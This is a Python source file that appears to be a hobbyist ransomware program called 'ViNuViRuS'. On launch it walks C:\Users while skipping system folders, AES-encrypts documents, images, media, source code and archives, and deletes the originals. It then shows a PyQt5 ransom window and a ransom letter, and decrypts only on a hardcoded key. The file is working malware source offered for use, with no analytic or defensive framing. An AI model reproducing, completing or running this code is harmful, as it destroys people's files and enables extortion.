import sys
import os
import pyAesCrypt
from cryptography.fernet import Fernet
from PyQt5.QtWidgets import QPushButton
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtGui import QMovie
from tkinter import messagebox
from tkinter import *



class Ui_ViNuViRuS(object):
    def setupUi(self, ViNuViRuS):
        ViNuViRuS.setObjectName("ViNuViRuS")
        ViNuViRuS.resize(1231, 988)
        ViNuViRuS.setStyleSheet("rgb 170, 0, 0")
        self.centralwidget = QtWidgets.QWidget(ViNuViRuS)
        self.centralwidget.setObjectName("centralwidget")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(4, 0, 1521, 951))
        self.label.setText("")
        self.label.setPixmap(QtGui.QPixmap("GUI_DATA/red.jpg"))
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(330, 140, 661, 511))
        self.label_2.setText("")
        self.label_2.setPixmap(QtGui.QPixmap("GUI_DATA/Virus.gif"))
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(290, 30, 961, 51))
        self.label_3.setObjectName("label_3")
        self.lineEdit = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(460, 670, 381, 31))
        self.lineEdit.setObjectName("lineEdit")
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(560, 720, 151, 31))
        self.pushButton.setObjectName("pushButton")
        self.pushButton_2 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_2.setGeometry(QtCore.QRect(510, 90, 281, 31))
        self.pushButton_2.setCheckable(False)
        self.pushButton_2.setAutoDefault(False)
        self.pushButton_2.setDefault(False)
        self.pushButton_2.setFlat(False)
        self.pushButton_2.setObjectName("pushButton_2")
        ViNuViRuS.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(ViNuViRuS)
        self.statusbar.setObjectName("statusbar")
        ViNuViRuS.setStatusBar(self.statusbar)

        self.retranslateUi(ViNuViRuS)
        QtCore.QMetaObject.connectSlotsByName(ViNuViRuS)

    def retranslateUi(self, ViNuViRuS):
        _translate = QtCore.QCoreApplication.translate
        ViNuViRuS.setWindowTitle(_translate("ViNuViRuS", "MainWindow"))
        self.label_3.setText(_translate("ViNuViRuS", "<html><head/><body><p><span style=\" font-size:18pt;\">OOOPS !! YOUR ALL FILES HAVE BEEN ENCRYPTED !!</span></p></body></html>"))
        self.pushButton.setText(_translate("ViNuViRuS", "Release Files !!!"))
        self.pushButton_2.setText(_translate("ViNuViRuS", "Get More Information !!!"))
        self.movie = QMovie("GUI_DATA/Virus.gif")
        self.label_2.setMovie(self.movie)
        self.movie.start()
        self.pushButton.clicked.connect(self.Match_Special_Key)

        self.pushButton_2.clicked.connect(self.Show_Ransom_Letter)

    def Show_Ransom_Letter(self):
        root = Tk()
        l1 = Label(text="Opening Ransom Letter...",font="comicsansms 19 bold",fg="red")
        l1.pack()


        os.startfile("Ransom.pdf")
        root.mainloop()

    def Match_Special_Key(self):
        key = self.lineEdit.text()

        if key=='VinuIsTheBestHacker@1593':
            messagebox.showinfo("Correct Key !!","Correct key entered now decrypting your files :)")
            Decrypt_Files = Decrypter()

            Decrypt_Files.Decrypt_Files()
            messagebox.showinfo("Success !!","Successfully Decrypted all your files !!")
            exit()

        else:
            messagebox.showerror("Incorrect Key !!","Incorrect Key entered :( Try again !")









def convert_to_list(str1):
    list1 = list(str1.split("\n"))

    return list1




class Ransom_Ware(object):
    def __init__(self):
        os.mkdir("Restored")
        # This the main file which contains the special key
        f = open("Restored//RecylceBin.data","a+")
        password = Fernet.generate_key()
        f.write(str(password))
        f.close()

    EXCLUDE_DIRECTORY = (   '/usr', #Mac/Linux system directory
                            '/Library/',
                            '/System',
                            '/Applications',
                            '.Trash',
                            #Windows system directory
                            'Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$Recycle.Bin',
                            'AppData',
                            
                            'logs',

        )

    EXTENSIONS = (
        # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies

        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
        
        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
        '.java', '.class', '.jar', # java source code
        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
        '.go', '.pyc', '.bf', '.coffee', # other source code files

        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
            )

    def Find_Files(self,path):
        f = open("Restored//Path.dat", "a+")
        for root, dirs, files in os.walk(path):
            #for root, dirs, files in os.walk("YOUR/TESTING/DIRECTORY"):
            if any(s in root for s in self.EXCLUDE_DIRECTORY):
                pass
            else:
                for file in files:
                     if file.endswith(self.EXTENSIONS):
                        TARGET = os.path.join(root, file)
                        f.write(TARGET+'\n')


        f.close()

    def Encrypt_Files(self):
        f = open("Restored//Path.dat","r")

        files_to_encrypt = convert_to_list(f.read())
        f.close()

        for file in files_to_encrypt:
            try:
                f = open("Restored//RecylceBin.data","r")
                pyAesCrypt.encryptFile(file,f"{file}.ViNuViRuS",f.read())
                os.remove(file)

            except Exception as e:
                print(e)

        f.close()



class Decrypter(object):
    def __init__(self):
        pass

    def Decrypt_Files(self):
        f = open("Restored//Path.dat","r")

        files_to_decrypt = convert_to_list(f.read())

        for file in files_to_decrypt:
            try:
                f = open("Restored//RecylceBin.data","r")
                pyAesCrypt.decryptFile(f"{file}.ViNuViRuS",file,f.read())
                os.remove(f"{file}.ViNuViRuS")

            except Exception as e:
                f.close()
                print(e)

        f.close()

class Start_Ransom(object):
    def __init__(self):
        RanSom = Ransom_Ware()
        RanSom.Find_Files("C:\\Users")
        RanSom.Encrypt_Files()
        self.Show_GUI()


    def Show_GUI(self):
        app = QtWidgets.QApplication(sys.argv)
        ViNuViRuS = QtWidgets.QMainWindow()
        ui = Ui_ViNuViRuS()
        ui.setupUi(ViNuViRuS)
        ViNuViRuS.show()
        sys.exit(app.exec_())
       


main = Start_Ransom()
main()